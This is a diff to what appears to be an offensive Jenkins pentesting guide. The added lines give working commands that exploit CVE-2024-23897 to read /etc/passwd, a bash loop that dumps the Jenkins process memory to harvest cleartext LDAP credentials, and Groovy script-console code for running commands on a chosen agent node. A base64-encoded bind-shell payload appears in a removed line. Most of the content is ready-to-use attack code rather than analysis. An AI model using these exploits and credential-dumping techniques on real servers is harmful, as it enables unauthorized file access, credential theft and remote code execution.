@@ -2,6 +2,31 @@
 
 Remote Code Execution
 =====================
+Jenkins CLI arbitrary read (CVE-2024-23897 applies to versions below 2.442 and LTS 2.426.3)
+-------------------------------------------
+[Jenkins Advisory](https://www.jenkins.io/security/advisory/2024-01-24/), [Credits](https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/)
+
+Authenticated, can retrieve a complete file:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins -auth abc:abc connect-node "@/etc/passwd"
+```
+
+Unauthenticated or missing Global/Read permissions, can only read 3 lines:
+Read first line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins who-am-i "@/etc/passwd"
+```
+Read second line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins enable-job "@/etc/passwd"
+```
+Read third line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins keep-build "@/etc/passwd"
+```
+
+[How to bruteforce the credential encryption key.](https://www.errno.fr/bruteforcing_CVE-2024-23897.html)
+
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 ---------------------------------------------------------------------------
 Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
@@ -60,6 +85,13 @@ Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
 This one will only work is a user has the 'Jobs/Configure' rights in the security matrix so it's very specific.
 
 
+CorePlague (CVE-2023-27898, CVE-2023-27905)
+-------------------------------------------
+[Jenkins Advisory](https://www.jenkins.io/security/advisory/2023-03-08/), [Credits](https://blog.aquasec.com/jenkins-server-vulnerabilities)
+
+Note that this is only exploitable if using a *dedicated* and out-of-date [Update Center](https://www.jenkins.io/templates/updates/). Therefore most servers are not vulnerable.
+
+
 Dumping builds to find cleartext secrets
 ========================================
 Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.
@@ -114,6 +146,19 @@ grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
 ```
 
 
+Dumping LDAP credentials on a compromised machine
+=================================================
+
+If Jenkins is configured to verify user credentials by relaying them to a LDAP (which is retarded, but a common vulnerability in companies) it's possible to recover these cleartext user credentials by dumping the Java process' memory.
+Assuming PID 7 for the Jenkins server the following loop will perform a memory dump of the stack every 30 seconds:
+```bash
+head -n 1 /proc/7/maps
+a=<first hex number>
+b=<second hex number>
+while [ 1 ]; do dd if=/proc/7/mem bs=$(getconf PAGESIZE) iflag=skip_bytes,count_bytes skip=$((0x$a)) count=$((0x$b - 0x$a)) of=/tmp/tmp.bin; strings /tmp/tmp.bin | grep "uid=" && break; sleep 30; done
+```
+A small delay is important because the garbage collector will regularly free the credential structures.
+
 Decrypt Jenkins secrets offline
 ===============================
 
@@ -149,13 +194,38 @@ proc.waitForProcessOutput(os, System.err);
 println(os.toString());
 ```
 
-For multiline shell commands, use the following shell syntax trick (example includes bind shell):
+Multiline shell command that can include pipes, redirects and stuff:
 
 ```java
-def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
+def proc = ['bash', '-c', '''your_long_command_here'''].execute();
 ```
 
 Automate it using [this script](./rce/jenkins_rce_admin_script.py).
+
+Command execution on specific slave
+-----------------------------------
+By default execution happens on the master node. Use this script to execute on a specific slave:
+```java
+import hudson.util.RemotingDiagnostics
+import jenkins.model.Jenkins
+
+String agent_name = 'slave_name'
+
+groovy_script = '''
+def proc = ['cmd', '/c', 'cd D:\\\\ && dir data'].execute();
+def os = new StringBuffer();
+proc.waitForProcessOutput(os, System.err);
+println(os.toString());
+'''
+
+String result
+Jenkins.instance.slaves.find { agent ->
+    agent.name == agent_name
+}.with { agent ->
+    result = RemotingDiagnostics.executeGroovy(groovy_script, agent.channel)
+}
+println result
+```
 
 Reverse shell from Groovy
 -------------------------
